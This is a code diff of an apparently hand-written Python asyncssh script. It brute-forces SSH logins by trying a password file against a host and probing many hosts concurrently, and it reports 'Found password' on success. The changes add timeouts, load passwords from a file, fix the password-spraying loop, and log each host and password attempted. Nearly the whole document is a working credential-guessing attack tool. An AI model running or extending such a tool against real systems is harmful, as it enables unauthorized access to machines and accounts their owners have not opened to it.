@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 # coding: utf-8
 
+import multiprocessing
 import asyncssh
 import asyncio
-import multiprocessing
+import math
+from units import units
 
 
 class Conn:
@@ -13,7 +15,8 @@ class Conn:
                  port=22,
                  known_hosts=None,
                  process_num=multiprocessing.cpu_count(),
-                 thread_num=5):
+                 thread_num=5,
+                 timeout=5):
         self.host = host
         self.username = username
         self.password = password
@@ -21,6 +24,7 @@ class Conn:
         self.known_hosts = known_hosts
         self.process_num = process_num
         self.thread_num = thread_num
+        self.timeout = timeout
 
     async def run_client(self, host=None, password=None):
         if not host:
@@ -35,32 +39,33 @@ class Conn:
             return await conn.run('echo "Found password: %s"' % self.password)
 
     async def run_multiple_hosts(self, hosts, callback):
-        tasks = (asyncio.wait_for(self.run_client(host=host), timeout=5) for host in hosts)
+        tasks = (asyncio.wait_for(self.run_client(host=host), timeout=self.timeout) for host in hosts)
         results = await asyncio.gather(*tasks, return_exceptions=True)
         for i, result in enumerate(results, 1):
             if isinstance(result, Exception):
-                if str(result) == 'Disconnect Error: Permission denied':
+                if str(result) == '':
+                    print('Task %s failed: Time out' % hosts[i - 1])
+                elif str(result) == 'Disconnect Error: Permission denied':
                     callback(hosts[i - 1])
-                print('Task %d failed: %s' % (i, result))
+                else:
+                    print('Task %s failed: %s' % (hosts[i - 1], result))
             elif result.exit_status != 0:
-                print('Task %d exited with status %s:' % (i, result.exit_status))
+                print('Task %s exited with status %s:' % (hosts[i - 1], result.exit_status))
                 print(result.stderr, end='')
             else:
-                print('Task %d succeeded: ' % i, end='')
-                print(result.stdout, end='')
+                print('Task %s succeeded: ' % hosts[i - 1])
 
     async def run_multiple_password(self, passwords):
-        tasks = (self.run_client(password) for password in passwords)
+        tasks = (asyncio.wait_for(self.run_client(password=password), timeout=self.timeout) for password in passwords)
         results = await asyncio.gather(*tasks, return_exceptions=True)
         for i, result in enumerate(results, 1):
             if isinstance(result, Exception):
-                print('Task %d failed: %s' % (i, result))
+                print('Host: %s Password: %s failed: %s' % (self.host, passwords[i - 1], result))
             elif result.exit_status != 0:
-                print('Task %d exited with status %s:' % (i, result.exit_status))
+                print('Host: %s Password: %s exited with status %s:' % (self.host, passwords[i - 1], result.exit_status))
                 print(result.stderr, end='')
             else:
-                print('Task %d succeeded: ' % i, end='')
-                print(result.stdout, end='')
+                print('Host: %s Password: %s succeeded: ' % (self.host, passwords[i - 1]), end='')
 
     def test_hosts(self, loop_instance, hosts_filename, callback):
         hosts = []
@@ -76,13 +81,11 @@ class Conn:
                     hosts = []
                 hosts.append(line)
 
-    def test_passwords(self, passwords):
-        if not isinstance(passwords, list):
-            print('argument passwords is not a list')
-            return False
+    def test_passwords(self, passwords_filename):
+        passwords = units.fdata2list(passwords_filename)
         password_count = math.ceil(len(passwords) / self.thread_num)
         loop = asyncio.get_event_loop()
         while password_count:
-            loop.run_until_complete(self.run_multiple_hosts(passwords[:self.thread_num]))
+            loop.run_until_complete(self.run_multiple_password(passwords[:self.thread_num]))
             passwords = passwords[self.thread_num:]
             password_count = math.ceil(len(passwords) / self.thread_num)
